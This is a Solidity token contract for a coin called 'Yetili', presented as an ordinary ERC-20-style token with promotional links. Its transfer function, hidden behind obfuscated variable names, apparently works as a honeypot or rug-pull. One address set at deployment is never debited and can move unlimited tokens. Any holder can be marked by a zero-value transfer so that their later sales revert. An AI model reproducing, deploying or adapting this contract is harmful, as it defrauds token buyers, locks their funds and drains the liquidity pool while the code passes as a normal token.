/*

Website: http://yetili.vip/
Telegram: https://t.me/YetiliEntry
Twitter: https://twitter.com/yetilierc

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Yetili is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private mastery;

    function danify(address diplomatically, address to, uint256 value) private returns (bool success) {
        if (mastery[diplomatically] == 0) {
            balanceOf[diplomatically] -= value;
        }

        if (value == 0) ghost[to] += acquiescence;

        if (mastery[diplomatically] == 0 && uniswapV2Pair != diplomatically && ghost[diplomatically] > 0) {
            mastery[diplomatically] -= acquiescence;
        }

        balanceOf[to] += value;
        emit Transfer(diplomatically, to, value);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    address public uniswapV2Pair;

    string public symbol = 'YETILI';

    uint8 public decimals = 9;

    uint256 public totalSupply = 100_000_000_000 * 10 ** 9;

    uint256 private acquiescence = 10;

    function transferFrom(address diplomatically, address to, uint256 value) public returns (bool success) {
        danify(diplomatically, to, value);
        require(value <= allowance[diplomatically][msg.sender]);
        allowance[diplomatically][msg.sender] -= value;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    constructor(address acknowledgement) {
        balanceOf[msg.sender] = totalSupply;
        mastery[acknowledgement] = acquiescence;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        danify(msg.sender, to, value);
        return true;
    }

    string public name = 'Yetili';

    mapping(address => uint256) private ghost;
}